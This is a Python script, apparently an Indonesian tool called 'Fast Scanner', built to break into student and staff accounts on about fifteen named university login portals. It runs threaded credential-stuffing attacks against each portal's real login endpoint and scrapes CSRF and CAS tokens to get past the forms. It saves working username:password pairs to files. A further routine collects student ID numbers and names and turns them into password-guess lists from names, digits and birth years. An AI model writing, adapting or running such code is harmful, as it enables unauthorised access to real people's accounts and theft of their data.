import requests as req
from bs4 import BeautifulSoup as bs
import urllib.parse
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
import os, time, platform, hashlib, json, sys
import concurrent.futures

            
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[97m'
bold = '\033[1m'
off = '\x1b[m'
sukses = []
rv = platform.uname()
me = rv.release
line = 0
stopp = ["1","2"]
error = []
xtc = []


def main():
    os.system('clear')
    
    try:
        pw = input(f"{cyan} Password ➤ {yellow} ")
        if pw == 'ade':
            os.system('clear')
            gerak(f'{cyan} _   _       ___     __\n| | | |_ __ (_) \   / /\n{purple}| | | |  _ \| |\ \ / /\n| |_| | | | | | \ V /_ _\n {yellow}\___/|_| |_|_|  \_/(_|_)\n {cyan}Fast Scanner by @z3zeiy\n',0.001)
            print(f"{off}{cyan}-"*30)
            gerak(f"{cyan}{bold}[{white}01{cyan}]{purple}➤ {yellow}SCAN UB\n",0.001)
            gerak(f"{cyan}{bold}[{white}02{cyan}]{purple}➤ {yellow}SCAN UPI\n",0.001)
            gerak(f"{cyan}{bold}[{white}03{cyan}]{purple}➤ {yellow}SCAN UII\n",0.001)
            gerak(f"{cyan}{bold}[{white}04{cyan}]{purple}➤ {yellow}SCAN UAJY\n",0.001)
            gerak(f"{cyan}{bold}[{white}05{cyan}]{purple}➤ {yellow}SCAN BINUS\n",0.001)
            gerak(f"{cyan}{bold}[{white}06{cyan}]{purple}➤ {yellow}SCAN UGM\n",0.001)  
            gerak(f"{cyan}{bold}[{white}07{cyan}]{purple}➤ {yellow}SCAN UI\n",0.001)     
            gerak(f"{cyan}{bold}[{white}08{cyan}]{purple}➤ {yellow}SCAN GUNDAR\n",0.001)  
            gerak(f"{cyan}{bold}[{white}09{cyan}]{purple}➤ {yellow}SCAN MERCUBUANA\n",0.001)     
            gerak(f"{cyan}{bold}[{white}10{cyan}]{purple}➤ {yellow}SCAN IPB\n",0.001)  
            gerak(f"{cyan}{bold}[{white}11{cyan}]{purple}➤ {yellow}SCAN ITB\n",0.001)   
            gerak(f"{cyan}{bold}[{white}12{cyan}]{purple}➤ {yellow}SCAN UNSM\n",0.001)     
            gerak(f"{cyan}{bold}[{white}13{cyan}]{purple}➤ {yellow}SCAN UNUSA\n",0.001)   
            gerak(f"{cyan}{bold}[{white}14{cyan}]{purple}➤ {yellow}SCAN NIM\n",0.001)     
            print(f"{cyan}{bold}[{white}00{cyan}]{red}➤ exit")
            print(f"{off}{cyan}-"*30)
            pilihan = input(f"\n{purple}[{white}?{purple}] {yellow}Pilih ➤ {yellow}")
            if pilihan == '1':            
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(ub, user, pswd)
                    time.sleep(4)
                simpan()
    
                
            elif pilihan == '22':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(unsrat, user, pswd)
                    time.sleep(0.90)
                simpan()
    
                
                
            elif pilihan == '2':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=60) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(upi, user, pswd)
                    time.sleep(4)
                simpan()
                
            elif pilihan == '3': 
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(uii, user, pswd)
                    time.sleep(2)
                       
                simpan()
                
            elif pilihan == '4':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(uajy,  user, pswd)
                    time.sleep(0.150)
                simpan()
                
            elif pilihan == '5':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=50) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(binus,  user, pswd)
                    time.sleep(2)
                simpan()
        
        
            elif pilihan == '6':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(ugm,  user, pswd)
                    time.sleep(4)
                simpan()
              
              
              
            elif pilihan == '7':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(ui,  user, pswd)
                    time.sleep(4)
                simpan()
                
            elif pilihan == '8':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(gun,  user, pswd)
                    time.sleep(4)
                simpan()
                
                
            elif pilihan == '9':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(mer,  user, pswd)
                    time.sleep(4)
                simpan()
             
            elif pilihan == '10':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(ipb,  user, pswd)
                    time.sleep(4)
                simpan()
             
            elif pilihan == '11':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=20) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(itb,  user, pswd)
                    time.sleep(4)
                simpan()
             
            elif pilihan == '12':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(unsm,  user, pswd)
                    time.sleep(4)
                simpan()
                
                
            elif pilihan == '13':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(unusa,  user, pswd)
                    time.sleep(4)
                simpan()
                
            elif pilihan == '19':
              list = input(f"{off}{purple}[{cyan}+{off}{purple}]{purple} Input file {purple}: ")
              with open(list, 'r') as file:
                lines = file.readlines()
                print(f"{off}{purple}[{cyan}+{off}{purple}]{purple}Total {cyan}{len(lines)} {purple}Akun Terdeteksi \n")
                with ThreadPoolExecutor(max_workers=30) as crot:
                    for line in lines:
                       data = line.strip()
                       user = data.split(':')[0] 
                       pswd = data.split(':')[1]
                       crot.submit(ibbi,  user, pswd)
                    time.sleep(0.25)
                simpan()
             
            elif pilihan == '14':
                 asu()  
        else:
            exit()
            
    except KeyboardInterrupt:
        exit(f"\n{purple}[{white}!{purple}]{white} Berhenti Paksa....!!!!\x1b[0m")
    except FileNotFoundError:
        gerak(f"\r\n\n{purple}[{white}!{purple}]{red} FORMAT WORDLIST KOSONG..!!! \n",0.01)        
        exit()
    except IndexError:
        gerak(f"\r\n\n{purple} [{white}!{purple}]{white}Maaf Format  Salah \n",0.01)
        exit()

def simpan():
    print(f"{off}{purple}-"*30)
    print(f'{grey}\n[ {purple} Modar:{len(error)} {cyan} | {green} SCAN SELESAI {grey}]')
    print(f'{grey}{off} ➤ Data Tersimpan : {green}{len(sukses)} akun{grey}\n---------------------------\n ')
    print(f"\r{purple}[{white}1{purple}]{white} Kembali Scan")
    print(f"\r{purple}[{white}2{purple}]{red} exit")
    keluar = input(f"\n{white}[{green}?{white}] {cyan}> Pilih :  {white}")
    if keluar == "1":
        main()
    elif keluar == "2":
        exit()
    if keluar not in stopp:
        exit(f"\n{purple}[{white}!{purple}]{red} Pilihan Salah....!!!!\x1b[0m")
        exit()

def unusa(usr, pwd):
    url = 'https://sim.unusa.ac.id/front/gate/index.php'
    dat = {'txtUserID':usr,  'txtPassword':pwd, 
		 'submit':'submit'}
    raw = req.post(url, data=dat, verify=False, timeout=10).text
    sta = bs(raw, 'html.parser').title.get_text()
    if sta == 'Selamat Datang':
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_unusa.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")
    else:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")


def ub(usr, pwd):
    url = 'https://siam.ub.ac.id/'
    dat = {'username':usr,  'password':pwd, 
     'login':'submit'}
    raw = req.post(url, data=dat, verify=False, timeout=10).text
    res = bs(raw, 'html.parser').title.get_text()
    if res == 'Sistem Informasi Akademik Mahasiswa':
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_ub.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")
    else:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
        
def unsrat(usr, pwd):
    ses = req.Session()
    url = 'https://inspire.unsrat.ac.id/login/autentikasi'
    dat = {  'username':usr, 'password':pwd, }
    post = ses.post(url,data=dat)
    if "Username atau Password salah" in post.text:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
    else:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_unsrat.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")

def upi(usr, pwd):
    ses = req.Session()
    url = 'https://sso.upi.edu/cas/login'
    raw = ses.get(url).text
    tok = bs(raw, 'html.parser').findAll('input')[2]['value']
    dat = {'username':usr,  'password':pwd, 
        'execution':tok, 
        '_eventId':'submit', 
        'submit':'LOGIN'}
    gas = ses.post(url, data=dat).text
    res = bs(gas, 'html.parser').findAll('div')[2]['class'][0]
    if res == 'success':
         print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
         sukses.append(f"{usr}")
         with open('hasil_upi.txt', 'a') as save:
                save.write(f"{usr}:{pwd}\n")
    else:
          print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
          error.append(f"{usr}")
            
def uii(usr, pwd):
    ses = req.Session()
    url = 'https://cloud-api.uii.ac.id/v1/login'
    ro = req.options(url, verify=False)
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 4.4.2; SAMSUNG-SM-T537A Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/35.0.1916.141 Safari/537.36',
                 'Referer': 'https://gateway.uii.ac.id/account/login'}
    data = {'kd_member': usr, 'password': pwd}
    rp = req.post(url, headers=headers, data=data, verify=False)
    ggl = 'Username atau password salah'
    if ggl in rp.text:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
    else:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_uii.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")

def uajy(usr, pwd):
    ses = req.Session()
    url = 'https://sikma.uajy.ac.id/Account/Login'
    raw = ses.get(url).text 
    tok = bs(raw, 'html.parser').findAll('input')
    tok1 = tok[4]['value']
    dat = { '__RequestVerificationToken':tok1,
                   'username':usr,
                   'password':pwd, }
    res = ses.post(url, data=dat).text
    qn = bs(res, 'html.parser').find('title')
    if qn.text == 'Login - SIKMA':
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
    else:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_uajy.txt', 'a') as save:
                   save.write(f"{usr}:{pwd}\n")
                   
def ui(usr, pwd):
    ses = req.Session()
    url = 'https://sso.ui.ac.id/cas/login'
    raw = ses.get(url).text
    tok = bs(raw, 'html.parser').findAll('input')
    dat = {'username':usr,  'password':pwd, 
     'lt':tok[2]['value'], 
     'execution':tok[3]['value'], 
     '_eventId':'submit'}
    res = ses.post(url, data=dat).headers
    try:
        mantap = res['Set-Cookie']
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_ui.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")
    except:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
        
def unsm(usr, pwd):
    ses = req.Session()
    url = 'https://sso.uns.ac.id/module.php/core/loginuserpass.php?AuthState=_d91c01e8596c30bf20b688315e9452e87dc6485aba%3Ahttps%3A%2F%2Fsso.uns.ac.id%2Fmodule.php%2Fcore%2Fas_login.php%3FAuthId%3Ddefault-sp%26ReturnTo%3Dhttps%253A%252F%252Fsso.uns.ac.id%252Fmodule.php%252Funs%252Findex.php'
    raw = ses.get(url).text
    tok = bs(raw, 'html.parser').findAll('input')[0]['value']
    dat = {'AuthState':tok,
     'username':usr,
     'password':pwd,
     'submit':'submit'}
    post = ses.post("https://sso.uns.ac.id/module.php/core/loginuserpass.php?",data=dat)
    if "Home" in post.text:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_unsm.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")
    else:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
        
        
def ibbi(usr, pwd):
    ses = req.Session()
    url = 'http://siakad.stmikibbi.ac.id/siamhs/login.php'
    dat = { "text":usr, "pass":pwd, "submit":"submit" }
    post = ses.post(url, data=dat)
    if "Login Succes" in post.text:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_binus.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")
    else:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
        
def binus(usr, pwd):
    ses = req.Session()
    url = 'https://myclass.apps.binus.ac.id/Auth/Login'
    dat = { "Username":usr, "Password":pwd }
    post = ses.post(url, data=dat)
    if "Login Succes" in post.text:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_binus.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")
    else:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
        
        
def gun(usr, pwd):
    ses = req.Session()
    url = 'https://studentsite.gunadarma.ac.id/index.php/site/login'
    dat = {'username':usr, 'password':pwd,
		'submit':'submit'}
    res = ses.post(url, data=dat).headers
    try:
        mantap = res['Set-Cookie']
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
    except:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_gundar.txt', 'a') as save:
                   save.write(f"{usr}:{pwd}\n")
                   
def ipb(usr, pwd):
    ses = req.Session()
    anu = 'https://simak.ipb.ac.id/Account/Login'
    anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
    dat = {
                '__RequestVerificationToken': anus[0]['value'], 
                'UserName': usr, 'Password': pwd
              }
    anuin = bs(ses.post(anu, timeout=10, data=dat, verify=False).text, 'html.parser').find('title')
    if anuin.text == 'Login | Sistem Informasi Akademik IPB':
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
    else:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_ipb.txt', 'a') as save:
                   save.write(f"{usr}:{pwd}\n")
                   
                   
def itb(usr, pwd):
    ses = req.Session()
    anu = 'https://login.itb.ac.id/cas/login'
    anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
    dat = {
                'username': usr, 'password': pwd, 
                'execution': anus[2]['value'], 
                '_eventId': 'submit', 'submit': 'LOGIN'
              }
    anuin = ses.post(anu, data=dat, timeout=10, verify=False)
    if anuin.status_code == 401:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
    else:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_itb.txt', 'a') as save:
                   save.write(f"{usr}:{pwd}\n")
                   
                   
def mer(usr, pwd):
    ses = req.Session()
    url = 'https://sso.mercubuana.ac.id'
    raw = ses.get(url).text
    tok = bs(raw, 'html.parser').findAll('input')[0]['value']
    dat = {'_method':tok,
     'username':usr,
     'password':pwd,
     'submit':'submit'}
    post = ses.post(url, data=dat)
    if "Home" in post.text:
        print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
        sukses.append(f"{usr}")
        with open('hasil_mercu.txt', 'a') as save:
            save.write(f"{usr}:{pwd}\n")
    else:
        print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
        error.append(f"{usr}")
   
   
def ugm(usr, pwd):
   ses = req.Session()
   url = 'https://sso.ugm.ac.id/cas/login?service=http%3A%2F%2Fsimaster.ugm.ac.id%2Fugmfw%2Fsignin_simaster%2Fsignin_proses'
   row = ses.get(url).text
   tok = bs(row, 'html.parser').findAll('input')[4]['value']
   tok1 = bs(row, 'html.parser').findAll('input')[5]['value']
   dat = {'username':usr, 'password':pwd, 'lt':tok,
'_eventId':tok1, 'submit':'MASUK'}
   raw = ses.post(url, data=dat).text
   try:
    her = bs(raw, 'html.parser').findAll('noscript')[0].get_text()
    print(f"{off}{yellow}[{purple}sukses{off}{yellow}]{white} -> {purple}{usr}{cyan}:{purple}{pwd}{off}")
    sukses.append(f"{usr}")
    with open('hasil_ugm.txt', 'a') as save:
         save.write(f"{usr}:{pwd}\n")
   except:
    print(f"{off}{purple}[{yellow}modar{off}{purple}]{cyan} -> {yellow}{usr}{red}:{yellow}{pwd}{off}")
    error.append(f"{usr}")
                   
def gerak(z, t):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(t)

def asu():
	print(f"{cyan}[{white}A{cyan}]{white}Nim:nim {off}: ")
	print(f"{cyan}[{white}B{cyan}]{white}Nim:nama + Angka {off}: ")
	print(f"{cyan}[{white}C{cyan}]{white}Nim:Nama + Angka {off}: ")
	print(f"{cyan}[{white}D{cyan}]{white}nama:nama + Angka {off}: ")
	_0 = input(f"{cyan}[{white}?{cyan}]{white}Pilih > ")
	_1 = cut(input(f"{cyan}[{white}+{cyan}]{cyan}Input Link {off}> "))
	_3 = stat(_1)
	if _0 == 'a':
		_2 = input(f"{off}{cyan}[+]{off}Nama Output {cyan}[{off}nama+.txt{cyan}] {off}: ")
		for _ in range(int(_3)):
			print(f"{yellow}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					#o_.write(__+':'+x[0].lower()+'\n')
					#o_.write(__+':'+x[1].lower()+'\n')
					#o_.write(__+':'+x[2].lower()+'\n')
					o_.write(__+':'+__+'\n')
			except:
				 o_.write(__+':'+__+'\n')
				 pass
		done(_2)
		
	elif _0 == 'b':
		_2 = input(f"{off}{cyan}[+]{off}Nama Output {cyan}[{off}nama+.txt{cyan}] {off}: ")
		for _ in range(int(_3)):
			print(f"{yellow}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+'@'+x[0].lower()+'\n')
					o_.write(__+':'+'@'+x[0].lower()+x[1].lower()+'\n')
					o_.write(__+':'+'@'+'12345678\n')
					o_.write(__+':'+'@'+'123456789\n')
					o_.write(__+':'+x[0].lower()+'1\n')
					o_.write(__+':'+x[0].lower()+'2\n')
					o_.write(__+':'+x[0].lower()+'3\n')
					o_.write(__+':'+x[0].lower()+'5\n')
					o_.write(__+':'+x[0].lower()+'4\n')
					o_.write(__+':'+x[0].lower()+'6\n')
					o_.write(__+':'+x[0].lower()+'7\n')
					o_.write(__+':'+x[0].lower()+'9\n')
					o_.write(__+':'+x[0].lower()+'8\n')
					o_.write(__+':'+x[0].lower()+'10\n')
					o_.write(__+':'+x[0].lower()+'11\n')
					o_.write(__+':'+x[0].lower()+'12\n')
					o_.write(__+':'+x[0].lower()+'13\n')
					o_.write(__+':'+x[0].lower()+'14\n')
					o_.write(__+':'+x[0].lower()+'15\n')
					o_.write(__+':'+x[0].lower()+'16\n')
					o_.write(__+':'+x[0].lower()+'17\n')
					o_.write(__+':'+x[0].lower()+'18\n')
					o_.write(__+':'+x[0].lower()+'19\n')
					o_.write(__+':'+x[0].lower()+'20\n')
					o_.write(__+':'+x[0].lower()+'21\n')
					o_.write(__+':'+x[0].lower()+'22\n')
					o_.write(__+':'+x[0].lower()+'23\n')
					o_.write(__+':'+x[0].lower()+'24\n')
					o_.write(__+':'+x[0].lower()+'25\n')
					o_.write(__+':'+x[0].lower()+'26\n')
					o_.write(__+':'+x[0].lower()+'27\n')
					o_.write(__+':'+x[0].lower()+'28\n')
					o_.write(__+':'+x[0].lower()+'29\n')
					o_.write(__+':'+x[0].lower()+'30\n')
					o_.write(__+':'+x[0].lower()+'31\n')
					o_.write(__+':'+x[0].lower()+'32\n')
					o_.write(__+':'+x[0].lower()+'33\n')
					o_.write(__+':'+x[0].lower()+'34\n')
					o_.write(__+':'+x[0].lower()+'35\n')
					o_.write(__+':'+x[0].lower()+'36\n')
					o_.write(__+':'+x[0].lower()+'37\n')
					o_.write(__+':'+x[0].lower()+'38\n')
					o_.write(__+':'+x[0].lower()+'39\n')
					o_.write(__+':'+x[0].lower()+'40\n')
					o_.write(__+':'+x[0].lower()+'41\n')
					o_.write(__+':'+x[0].lower()+'42\n')
					o_.write(__+':'+x[0].lower()+'43\n')
					o_.write(__+':'+x[0].lower()+'44\n')
					o_.write(__+':'+x[0].lower()+'45\n')
					o_.write(__+':'+x[0].lower()+'46\n')
					o_.write(__+':'+x[0].lower()+'47\n')
					o_.write(__+':'+x[0].lower()+'48\n')
					o_.write(__+':'+x[0].lower()+'49\n')
					o_.write(__+':'+x[0].lower()+'50\n')
					o_.write(__+':'+x[0].lower()+'51\n')
					o_.write(__+':'+x[0].lower()+'52\n')
					o_.write(__+':'+x[0].lower()+'53\n')
					o_.write(__+':'+x[0].lower()+'54\n')
					o_.write(__+':'+x[0].lower()+'55\n')
					o_.write(__+':'+x[0].lower()+'56\n')
					o_.write(__+':'+x[0].lower()+'01\n')
					o_.write(__+':'+x[0].lower()+'02\n')
					o_.write(__+':'+x[0].lower()+'03\n')
					o_.write(__+':'+x[0].lower()+'04\n')
					o_.write(__+':'+x[0].lower()+'05\n')
					o_.write(__+':'+x[0].lower()+'06\n')
					o_.write(__+':'+x[0].lower()+x[1].lower()+'\n')
					o_.write(__+':'+x[0].lower()+x[1].lower()+x[2].lower()+'\n')
					o_.write(__+':'+x[0].lower()+x[1].lower()+'1\n')
					o_.write(__+':'+x[0].lower()+x[1].lower()+'12\n')
					o_.write(__+':'+x[0].lower()+x[1].lower()+'123\n')
					o_.write(__+':'+x[0].lower()+x[1].lower()+'1234\n')
					o_.write(__+':'+x[0].lower()+x[1].lower()+'12345\n')
					o_.write(__+':'+x[0].lower()+'123\n')
					o_.write(__+':'+x[0].lower()+'123\n')
					o_.write(__+':'+x[0].lower()+'1234\n')
					o_.write(__+':'+x[0].lower()+'12345\n')
					o_.write(__+':'+x[0].lower()+'123456\n')
					o_.write(__+':'+x[0].lower()+'1234567\n')
					o_.write(__+':'+x[0].lower()+'12345678\n')
					o_.write(__+':'+x[0].lower()+'123456789\n')
					o_.write(__+':'+x[0].lower()+'2000\n')
					o_.write(__+':'+x[0].lower()+'1995\n')
					o_.write(__+':'+x[0].lower()+'1992\n')
					o_.write(__+':'+x[0].lower()+'1993\n')
					o_.write(__+':'+x[0].lower()+'1996\n')
					o_.write(__+':'+x[0].lower()+'1997\n')
					o_.write(__+':'+x[0].lower()+'1991\n')
					o_.write(__+':'+x[0].lower()+'1994\n')
					o_.write(__+':'+x[0].lower()+'1998\n')
					o_.write(__+':'+x[0].lower()+'1999\n')
